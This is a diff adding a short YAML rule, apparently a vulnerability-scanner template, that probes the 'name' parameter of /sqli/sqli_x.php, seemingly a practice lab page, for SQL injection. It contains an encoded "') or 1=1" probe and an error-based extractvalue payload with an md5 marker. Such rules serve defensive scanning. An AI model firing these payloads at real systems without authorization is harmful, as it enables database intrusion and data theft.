@@ -1,0 +1,18 @@
+name: sqli_x
+rules:
+  - method: GET
+    path: /sqli/sqli_x.php
+    follow_redirects: false
+    body: name=%27%29+or+1%3D1&submit=查询
+    expression: response.status==200 && lengthDiff && sqli_x
+  - method: GET
+    path: /sqli/sqli_x.php
+    follow_redirects: false
+    body: name=1&submit=查询
+    expression: response.status==200 && lengthDiff && sqli_x
+detail:
+  type: sqldet
+  paramkey: name
+  payload: admin'and/**/extractvalue(1,concat(char(126),md5(1634016457)))and'
+
+
